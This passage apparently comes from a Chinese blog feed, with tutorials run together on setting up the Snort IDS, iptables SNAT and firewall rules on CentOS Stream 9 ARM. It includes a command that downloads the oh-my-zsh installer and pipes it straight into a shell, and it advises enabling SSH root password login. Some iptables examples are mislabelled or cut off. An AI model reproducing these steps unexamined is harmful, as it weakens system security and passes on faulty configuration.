/usr/local/lib/snort_dynamicruleschown -R snort:snort /etc/snortchown -R snort:snort /var/log/snortchown -R snort:snort /usr/local/lib/snort_dynamicrules 775权限： root有读、写、执行权限 组用户有读、写、执行权限 其他用户有读、执行权限 读取权限 r&#x3D;4。写入权限 w&#x3D;2。执行权限 x&#x3D;1 第一个数字 ：拥有者权限（root，文件所有者） 第二个数字 ：组用户权限（与文件所有者属于同一个用户组） 第三个数字 ：其他用户权限 将这些文件的所属修改为之前创建的snort组里面的snort用户 查看文件所属 ls -l &lt;file&gt; 第一列含义： ​ 第一个字母含义： ​ 第一个字母d：意味着内容是目录或文件 ​ 如果第一个是-：意味着它的内容是文件 ​ 第一个是l：意味着内容是链接文件 ​ 后面的内容是文件所属 ​ （对应着三个数字权限775） ​ 前三个字母是文件拥有者权限 ​ 中间三个是文件所有组权限 ​ 后三个是其他人访问文件的权限 第二列含义：多少链接指向这个文件 第三列含义：谁是这个文件&#x2F;文件夹的所有者 第四列含义：谁是这个文件&#x2F;文件夹所有组 第五列含义：这个文件&#x2F;文件夹的以字节为单位的大小。目录的大小总是4096字节 第六列含义：文件最后修改时间 第七列含义：文件名或目录名 创建黑白名单和规则 123touch /etc/snort/rules/white_list.rulestouch /etc/snort/rules/black_list.rulestouch /etc/snort/rules/local.rules 创建告警文件夹 1234touch /var/log/snort/alertcd /var/log/snortchown snort.snort alertchmod 700 alert 复制配置文件 从下载的snort-2.9.20文件夹里复制配置文件 12cp ~/snortFile/snort-2.9.20/etc/*.conf* /etc/snortcp ~/snortFile/snort-2.9.20/etc/*.map /etc/snort 下载snort规则集snort官网提供了三种规则集： 社区版：免费的，但是只是很简单的规则限制 注册版：免费注册后可以获得code，用code可以下载注册版规则 订阅版：需要订阅，才可以下载规则 我选择了注册版，以下都以注册版进行演示。 注册链接 oinkcode 注册成功后，会给一个oinkcode，在个人信息中可以找到 然后就可以下载规则了，将oinkcode&#x3D;xxx，xxx换成自己的 1wget https://snort.org/downloads/registered/snortrules-snapshot-29200.tar.gz?oinkcode=xxx -O ~/registered.tar.gz Tips: 如果下载完成后解压失败的话，可以在物理机下载好，然后scp上传 1scp /Users/gryffinbit/Downloads/snortrules-snapshot-29200.tar.gz root@10.211.55.12:/root/ 复制规则 下载完成后，将规则解压到snort配置文件夹 /etc/snort 1tar xvf snortrules-snapshot-29200.tar.gz -C /etc/snort 配置网络和规则已经有了配置以及规则文件，需要修改snort.conf的变量。 1vim /etc/snort/snort.conf 修改snort.conf的内容 设置需要保护的ip地址，先用这台centos的ip，作为测试时的ip 12# Setup the network addresses you are protectingipvar HOME_NET server_public_ip/24 12# Set up the external network addresses. Leave as &quot;any&quot; in most situationsipvar EXTERNAL_NET !$HOME_NET 1234# Path to your rules files (this can be a relative path)var RULE_PATH /etc/snort/rulesvar SO_RULE_PATH /etc/snort/so_rulesvar PREPROC_RULE_PATH /etc/snort/preproc_rules 123# Set the absolute path appropriatelyvar WHITE_LIST_PATH /etc/snort/rulesvar BLACK_LIST_PATH /etc/snort/rules 在setp6里，设置输出 123# unified2# Recommended for most installsoutput unified2: filename snort.log, limit 128 注释掉Step #7里面没有的规则 1sudo sed -i &#x27;s/include \\$RULE\\_PATH/#include \\$RULE\\_PATH/&#x27; /etc/snort/snort.conf 翻到最下面，找到规则集列表。打开local.rules的注释，以允许snort装载个性化规则集。 1include $RULE_PATH/local.rules 保存编辑:wq 测试是否能正常工作 1snort -T -c /etc/snort/snort.conf 运行成功 添加基础规则进行测试1vim /etc/snort/rules/local.rules 1alert icmp any any -&gt; $HOME_NET any (msg:&quot;ICMP test&quot;; sid:10000001; rev:001;) 开启snort 1snort -A console -i enp0s6 -u snort -g snort -c /etc/snort/snort.conf 采用-A console 来打印出告警信息。需要选择正确的网络接口，比如eth0 见Blog：SNAT网络环境配置。接口选用了enp0s6（连接内网的接口） 发起攻击 关于网口的选择。nat server是做一个地址转换的，使得内网机器可以访外网。所以在做这个规则的时候，snort.conf HOME_NET里，如果是想对外部访问内部的流量进行监控，就将这个IP，写成nat server外网网卡的IP。因为外网实际不能直接访问到内网的机器的，都是只能访问到那个网关的公网IP。所以在SNAT这个网络环境里，想限制物理机（web server）访问内部机器的话，就要snort监听enp0s5这个外网网卡，snort.conf的IP写外网网关IP。如果是想让内部的网络之间有限制，就写内网的网段，监听enp0s6 查看日志snort会将检测结果记录在日志 1snort -r /var/log/snort/snort.log.timestamp timestamp是时间戳，每个日志会有时间戳的记录 * snort后台运行下载开机自启动脚本 12wget https://www.snort.org/documents/snort-startup-script-for-centos -O ~/snortdsudo chmod 755 ~/snortd &amp;&amp; sudo mv ~/snortd /etc/init.d/ 重载 1sudo systemctl daemon-reload 开启服务 1sudo systemctl start snortd 也可以查看状态、停止服务、开启服务等 1stop, restart, status 1sudo systemctl status snortd 附录：snort 文件部署路径snort安装包所在路径、相关文档 1/home/parallels/snortFile doc：snort的一些说明文档所在文件夹 snort规则文件、配置文件 1cd /etc/snort snort日志文件 1cd /var/log/snort snort运行 1/usr/local/bin/snort 参考文章snort官方配置","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"centos-stream-9","slug":"centos-stream-9","permalink":"https://gryffinbit.top/tags/centos-stream-9/"},{"name":"ARM架构","slug":"ARM架构","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallels虚拟机","slug":"parallels虚拟机","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"Gryffinbit"},{"title":"centos-stream-9下安装snort2.9【ARM虚拟机版】","slug":"centos-stream-9下安装snort2-9【ARM虚拟机版】","date":"2022-07-25T10:04:18.000Z","updated":"2024-11-12T06:59:48.000Z","comments":true,"path":"2022/07/25/centos-stream-9下安装snort2-9【ARM虚拟机版】/","permalink":"https://gryffinbit.top/2022/07/25/centos-stream-9%E4%B8%8B%E5%AE%89%E8%A3%85snort2-9%E3%80%90ARM%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%89%88%E3%80%91/","excerpt":"","text":"前言安装centos的相关配置，跳转Blog： centOS-Stream9ARM基础配置 tips: snort的环境是在centos的SNAT快照下进一步安装的，但由于无法访问互联网，所以会先将enp0s5（外网网卡）切换成共享网络模式，且解除绑定的固定IP，不在需要联网环境时，再恢复到SNAT时的网络环境 ps： snort官方文档里面给出的版本，才更新到centos8，snort 2.9.16.1 。我根据这个官方文档，把snort-2.9.20安装在了centos9-stream。或许有些未知错误。如果发现了，请在评论区交流学习。 环境配置CentOS: CentOS-Stream-9, ARM, Parallels虚拟机 CentOS操作用户：在root用户下进行snort部署 snort版本：snort-2.9.20 daq版本： daq-2.0.7 CentOS源：阿里源 更改dnf的源备份 1mv /etc/yum.repos.d/centos.repo /etc/yum.repos.d/centos.repo.backup 换成阿里源 1vim /etc/yum.repos.d/centos.repo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client. You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the # remarked out baseurl= line instead.## [base]name=CentOS-$releasever - Base - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that may be useful#[extras]#name=CentOS-$releasever - Extras - mirrors.aliyun.com#failovermethod=priority#baseurl=https://mirrors.aliyun.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/#gpgcheck=1#gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[PowerTools]name=CentOS-$releasever - PowerTools - mirrors.aliyun.comfailovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[AppStream]name=CentOS-$releasever - AppStream - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 1dnf makecache 更新系统软件升级所有包同时也升级软件和系统内核 12dnf update -ydnf install epel-release -y 更正时间 1sudo timedatectl set-timezone Asia/Shanghai 下载文件将下载的文件上传到centos 在官网下载daq和snort2.9的包：https://snort.org/downloads#sources 用物理机下载文件，把他们上传到centos 12wget https://snort.org/downloads/snort/daq-2.0.7.tar.gzwget https://snort.org/downloads/snort/snort-2.9.20.tar.gz 新建snort文件夹 新的snort文件夹，用于存放解压好的刚刚下载的两个文件。 1234cd /home/rootmkdir snortFiletar -zxvf daq-2.0.7.tar.gz -C snortFiletar -zxvf snort-2.9.20.tar.gz -C snortFile 安装相关依赖安装必要的环境 1dnf install gcc gcc-c++ libnetfilter_queue-devel git flex bison zlib zlib-devel pcre pcre-devel libdnet tcpdump libnghttp2 wget xz-devel -y 1dnf install make cmake automake autoconf libtool -y 报错找不到这个包：libnetfilter_queue-devel 添加仓库 CRB 1vim /etc/yum.repos.d/centos.repo 最后一行加入 12345678[crb]name = =CentOS-$releasever - CRB - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 1dnf makecache 再次安装这个包 1dnf --enablerepo=crb install libnetfilter_queue-devel -y 安装snort依赖 1dnf install libpcap-devel pcre-devel libdnet-devel hwloc-devel openssl-devel zlib-devel luajit-devel pkgconf libmnl-devel libunwind-devel -y 报错 Error: Unable to find a match: libmnl-devel 换repo重新安装 1dnf install libmnl 1dnf --enablerepo=crb install libmnl-devel -y 问题解决！ 安装daq依赖 12dnf install libnfnetlink-devel libnetfilter_queue-devel -ydnf install libtirpc-devel 安装daq安装daq数据采集库 123cd snortFile/daq-2.0.7./configuremake &amp;&amp; make install 123vim ~/.bash_profile# 添加路径PATH=$PATH:/usr/local/bin 检查所需依赖是否都安装成功 123which dnet-configwhich pcre-configwhich daq-modules-config 安装snort进入到snort安装包路径 1cd snortFile/snort-2.9.20 编译 123./configure --enable-sourcefiresudo makemake install 编译成功 snort安装成功 1snort -v Ctrl + c 退出 参考文章centos8 snort安装文档 snort3 centos 8 stream官方安装文档 各个版本安装文档 阿里crb库 找不到的库，就去查官方！会给出下载命令、仓库等各种配置","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"centos-stream-9","slug":"centos-stream-9","permalink":"https://gryffinbit.top/tags/centos-stream-9/"},{"name":"ARM架构","slug":"ARM架构","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallels虚拟机","slug":"parallels虚拟机","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"Gryffinbit"},{"title":"iptables配置SNAT实现共享上网","slug":"iptables配置SNAT实现共享上网","date":"2022-07-22T13:55:19.000Z","updated":"2024-11-12T06:59:37.000Z","comments":true,"path":"2022/07/22/iptables配置SNAT实现共享上网/","permalink":"https://gryffinbit.top/2022/07/22/iptables%E9%85%8D%E7%BD%AESNAT%E5%AE%9E%E7%8E%B0%E5%85%B1%E4%BA%AB%E4%B8%8A%E7%BD%91/","excerpt":"","text":"实验环境虚拟机均通过parallels desktop 17 安装 Ubuntu: Ubuntu 20.04.2 ARM64 【client内网客户机】 CentOS：CentOS-Stream-9-latest-aarch64-dvd1 【NAT server】 macOS: macOS Monterey. M1, 2020, ARM64【物理机 Web server】 Ubutntu的iptables版本：iptables v1.8.4 (legacy) CentOS的 iptables版本：iptables v1.8.8 (nf_tables) IP配置： 设备 IP地址 网关 macOS （web server，外网环境） 192.168.117.2 192.168.117.1 centOS （NAT server，内外网环境） Enp0s6 外网IP： 192.168.117.1 Enp0s5 内网IP： 10.37.129.1 ubuntu （client，内网环境） 10.37.129.6 10.37.129.1 网络拓扑： 原理解释NAT server：将IP地址转换另外一个IP，内部IP想要访问外网时，NAT实现内部和外部网络的转换。NAT一般部署在连接内网和外网的网关设备或者内外网之间的防火墙上。 通常NAT的两个网卡，连接内网的是内网的网关，连接外网的是一个公有地址。 WEB server：充当公网的服务，需要和内网进行交互连接 SNAT：把数据包的源地址由私网IP转换成公网IP。当相应的数据包从公网发到内网时，会把数据包的目的地址由公网IP转换成私网IP。不同内网主机会通过端口号进行区分。 如何实现的共享网络： 外网访问内网用户时。NAT的内网服务路由器收到内网的回应报文后，根据该回应报文的“源IP地址+源端口号”找出对应的公网IP+端口号，然后用查找结果替换报文的源IP地址+源端口号 开启iptables服务 CentOS默认是使用 firewalld 服务作为防火墙，我们需要禁用该服务，安装 iptables 服务。 此时网卡选用共享网络模式 1、停止 firewall 服务 1systemctl stop firewalld 2、注销 firewall 服务 1systemctl mask firewalld 3、安装 iptables 服务 12sudo yum install -y iptables sudo yum install -y iptables-services 4、启动 iptables 服务 1systemctl start iptables 或者 1service iptables start 5、设置 iptables 开机自启动 1systemctl enable iptables 6、查看 iptables 状态 1systemctl status iptables 或者 1service iptables status Active是激活状态 按q，返回命令行模式 7、查看 iptables 文件 此时可以在 /etc/sysconfig/ 目录下看到 iptables 文件 iptables 文件的初始内容如下： 常见iptables服务命令： 1、iptables 服务的停止命令如下： 1systemctl stop iptables 或者 1service iptables stop 2、iptables 服务的重启命令如下： 1systemctl restart iptables 或者 1service iptables restart 3、保存 iptables 文件修改，命令如下： 1service iptables save 4、重载 iptables 文件，命令如下： 1systemctl reload iptables 或者 1service iptables reload 5、查看已配置的iptables规则，命令如下： 1）不带编号 1iptables -n -L 2）带编号 1iptables -n -L --line-numbers 环境搭建 网络环境不要选择公司插网线的那种环境！选用家庭网络或者手机Wi-Fi充当一下。我目前觉得是公司网络防火墙配置导致了丢包率很高，而且很容易失败！ 1. 虚拟机准备 配置好ubuntu和centos，基本功能具备，这里不在赘述，在以往的blog里有记录 2. 网卡配置 ubuntu作为内网客户机，只需分配一个网卡 centos作为nat server需要两个网卡，一个对内连接，可以和内网机器交互。一个对外连接，和外网交互。 3. IP设定和配置 macOS物理机，充当webserver的角色。（mac通过设置 -&gt; 网络，查看网关） IP地址 网关 192.168.117.2 192.168.117.1 centos，充当NATsever的角色 在centos 网络设置页面修改IP 连接外网的IP地址 连接内网的IP地址 192.168.117.1【桥接模式-&gt;默认适配器，enp0s5】 10.37.129.1 【host-only，enp0s6】 ubuntu，充当客户机角色 手动设置IP 网卡的IP和网关一定要写死了！不然就会总出现问题，另外每次进入虚拟机的时候，把各个网卡都重启一下.都选择手动方式配置 绑定IP和掩码 1sudo ifconfig eth0 10.37.129.6 netmask 255.255.255.0 设置网关 1sudo route add default gw 10.37.129.1 查看路由 1route -n IP地址 网关 10.37.129.6 10.37.129.1 没有配置SNAT时，三台主机之间的网络互通情况 能否ping通 ubuntu（client） centos（nat server） macOS （web server） ubuntu ✅可以ping通网关10.37.129.1 ❌ 不能ping通 centos ✅ 可以ping通 ✅ 可以ping通 macOS ✅ 可以ping通 进行SNAT转换 要实现的效果，client可以访问web server，但需要通过NAT，地址转换为192.168.117.1访问 1. NAT server开启路由转发 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 1开启，0关闭 1vim /etc/sysctl.conf 打开注释 1net.ipv4.ip_forward = 1 执行修改 1sysctl -p 2. NAT server 设置防火墙规则，实现SNAT地址转换 SNAT是在postrouting链表的。地址转换，将内网的网段，转换为外网的IP，即外网出口的那个网关地址。 用curl去测的话，开80端口 1iptables -t nat -A POSTROUTING -s 10.37.129.0/24 -p tcp --dport 80 -j SNAT --to-source 192.168.117.1 用ping测的话，走icmp协议 1iptables -t nat -A POSTROUTING -s 10.37.129.0/24 -p icmp -j SNAT --to-source 192.168.117.1 将这条转发，永久写入nat server 1service iptables save 查看效果 1sudo iptables -t nat -L 测试结果内网客户机，可以ping通外网机器（iptables写的icmp的协议） 抓包分析为了验证内网机器ubuntu去访问外网的macOS时，是否进行了正确的地址转换，对macOS进行抓包，看从ubuntu过来的IP是不是预料中的192.168.117.1 Ubuntu发起ping，对macOS的eth0抓包，过滤icmp 可以看到多条来自192.168.117.1，目的为192.168.117.2 的ICMP包。 实验成功！ 参考文章[渗透测试]虚拟机搭建内外网环境 SNAT&#x2F;DNAT策略 vmware搭建多台Linux虚拟机内网环境 配置网关 NAT","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"入侵检测/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"},{"name":"SNAT","slug":"SNAT","permalink":"https://gryffinbit.top/tags/SNAT/"}],"author":"Gryffinbit"},{"title":"iptables策略实验","slug":"iptables策略实验","date":"2022-07-21T16:47:42.000Z","updated":"2024-11-12T06:59:39.000Z","comments":true,"path":"2022/07/22/iptables策略实验/","permalink":"https://gryffinbit.top/2022/07/22/iptables%E7%AD%96%E7%95%A5%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"前言iptables策略详解跳转blog：iptables常用策略 防火墙会按照从上到下的顺序来读取配置的策略规则，在找到匹配项后就立即结束匹配工作并去执行匹配项中定义的行为（即放行或阻止）。如果在读取完所有的策略规则之后没有匹配项，就去执行默认的策略。 实验环境（两台设备之间进行交互时）CentOS：CentOS-Stream-9-latest-aarch64-dvd1 【parallels desktop17 虚拟机】 CentOS的 iptables版本：iptables v1.8.8 (nf_tables) CentOS wireshark 客户端版本：Version 3.4.10 macOS: macOS Monterey. M1, 2020, ARM64 【物理机】 实验思路 在CentOS上面进行iptables的策略部署，使用macOS发送数据包来进行策略的测试。在CentOS上抓包，对进入的数据包分析。 IP配置 macOS CentOS 192.168.117.2 10.211.55.12 未配置防火墙策略时网路连接情况 CentOS采用共享网络模式 CentOS和macOS之间可以相互ping通 实验环境（三台设备之间交互，需要NAT server转发时）采用SNAT环境。见blog：iptables配置SNAT实现共享上网 IP配置 macOS centOS Ubuntu 172.20.10.2 外网网卡：172.20.10.1 内网网卡： 10.37.129.1 10.37.129.6 常用的策略管理查看路由信息 1sudo iptables -t nat -L 查看iptables已经设置的策略 1sudo iptables -L 列出规则的行号 1sudo iptables -nL --line-number 删除特定的行规则 12# 删除INPUT链中，第二条规则sudo iptables -D INPUT 2 删除全部规则 12# 删除nat表里所有规则sudo iptables -t nat -F 永久写入 1service iptables save 实验策略 拒绝进入防火墙的所有ICMP协议数据包 1sudo iptables -I INPUT -p icmp -j REJECT -I 默认将规则添加到第一行 macOS 无法ping通 允许防火墙转发除ICMP协议以外的所有数据包 1sudo iptables -A FORWARD -p icmp -j REJECT 配置这条规则之前，可以ping通MACOS（web server）。配置之后就无法ping通了。因为拒绝了icmp包 拒绝转发来自10.37.129.7主机的数据。允许转发来自10.37.129.0&#x2F;24网段的数据 开一台新的虚拟机kali，IP设置为10.37.129.7，网关设置为 10.37.129.1 1sudo iptables -I FORWARD -s 只允许管理员从202.13.0.0&#x2F;16网段使用SSH远程登录防火墙主机。 1iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT 1iptables -A INPUT -p tcp --dport 22 -j DROP 禁止其他主机ping防火墙主机，但是允许从防火墙上ping其他主机 1iptables -I INPUT -p icmp --icmp-type 8/0 -j REJECT 禁止转发来自MAC地址为00：0C：29：27：55：3F的和主机的数据包 1iptables -A FORWARD -m mac --mac-source 00：0C：29：27：55：3F -j DROP","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"入侵检测/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"}],"author":"Gryffinbit"},{"title":"centOS-Stream9ARM基础配置","slug":"centOS-Stream9ARM基础配置","date":"2022-07-20T14:21:20.000Z","updated":"2024-11-12T06:59:47.000Z","comments":true,"path":"2022/07/20/centOS-Stream9ARM基础配置/","permalink":"https://gryffinbit.top/2022/07/20/centOS-Stream9ARM%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/","excerpt":"","text":"一个细节发现源里面经常会有这种变量： 1https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ $basearch 的值，系统硬件架构(CPU指令集) 架构是aarch64 $stream 的值，就是系统版本了 版本是CentOS Stream release 9 地址代入该系统变量后的路径就是 1https://mirrors.aliyun.com/centos-stream/9-stream/AppStream/aarch64/os/ 打开ssh1sudo vim /etc/ssh/sshd_config 将PermitRootLogin prohibit-password那一行修改为PermitRootLogin yes，去掉前面的#号 将port 22前面的#去掉 更换源备份 1sudo mv /etc/yum.repos.d/centos.repo /etc/yum.repos.d/centos.repo.backup 换成阿里源 1sudo vi /etc/yum.repos.d/centos.repo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client. You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the # remarked out baseurl= line instead.## [base]name=CentOS-$releasever - Base - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that may be useful#[extras]#name=CentOS-$releasever - Extras - mirrors.aliyun.com#failovermethod=priority#baseurl=https://mirrors.aliyun.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/#gpgcheck=1#gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[PowerTools]name=CentOS-$releasever - PowerTools - mirrors.aliyun.comfailovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[AppStream]name=CentOS-$releasever - AppStream - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 123yum clean allyum makecache sudo yum update 如果想使用dnf的话，使dnf的源也更新 1sudo dnf makecache 添加CRB仓库 1vim /etc/yum.repos.d/centos.repo 最后一行加入 12345678[crb]name = =CentOS-$releasever - CRB - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 12dnf makecacheyum makecache 用crb下载 1dnf --enablerepo=crb install &lt;包名&gt; -y 可以通过https://pkgs.org/来查看要下载的包，是属于哪个仓库源的 安装vim1sudo yum search vim 1sudo yum install vim-enhanced.aarch64 安装oh-my-zsh安装git 12sudo yum search gitsudo yum install git.aarch64 安装zsh 1sudo yum install zsh 更改默认shell 1chsh -s /usr/bin/zsh github 443拒绝访问 1sudo vim /etc/hosts 加入 1192.30.255.113 github.com 就可以ping通了 安装oh-my-zsh（不能用ssh） 1sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; 网不好的情况下，就把脚本内容复制过来，在里面装 123vim install.shchmod +x install.shsudo ./install.sh 配置文件 1vim ~/.zshrc 修改主题 修改这一行ZSH_THEME=&quot;robbyrussell&quot;将主题修改为自己喜欢的 1ZSH_THEME=&quot;agnoster&quot; 重新加载配置文件 1source ~/.zshrc 下载插件 自动提示 1git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions 语法高亮 1git clone https://github.com/zsh-users/zsh-syntax-highlighting ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting 1echo &quot;source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot; &gt;&gt; ~/.zshrc 修改配置文件，生效插件 1vim ~/.zshrc 找到插件位置，添加刚刚的插件 1source ~/.zshrc 改自动提示颜色、亮度 PS：如果重新打开终端看不到自动提示，可能是终端的字体颜色太淡了，可以通过👇配置把字体改亮一些： 1cd ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions 修改自动提示相关的配置文件：ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=&#39;fg=10&#39; 12vi zsh-autosuggestions.zshsource ~/.zshrc 修改主题目录颜色 1sudo vim ~/.oh-my-zsh/themes/agnoster.zsh-theme","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"centOS-Stream","slug":"centOS-Stream","permalink":"https://gryffinbit.top/tags/centOS-Stream/"}],"author":"Gryffinbit"},{"title":"iptables常用策略","slug":"iptables常用策略","date":"2022-07-19T17:54:49.000Z","updated":"2024-11-12T06:59:38.000Z","comments":true,"path":"2022/07/20/iptables常用策略/","permalink":"https://gryffinbit.top/2022/07/20/iptables%E5%B8%B8%E7%94%A8%E7%AD%96%E7%95%A5/","excerpt":"","text":"前言iptables详解跳转blog：iptables介绍 iptables管理和规则跳转blog：piptables管理和规则 iptables文档：iptables(8) - Linux man page iptables指南：iptables-tutorial 防火墙常用策略拒绝进入防火墙的所有ICMP协议数据包w 1iptables -I INPUT -p icmp -j REJECT -I : 在指定链中插入一条规则，默认第一行， INPUT链：进入防火墙的必经之链， -p 选择协议 -j 对数据包执行的操作 允许防火墙转发除ICMP协议以外的所有数据包 1iptables -A FORWARD -p !icmp -j ACCEPT -A：在指定链的末尾添加（append）一条新的规则 拒绝转发来自192.168.1.10主机的数据。允许转发来自192.168.0.0&#x2F;24网段的数据 1iptables -A FORWARD -s 192.168.1.10 -j REJECT 1iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT 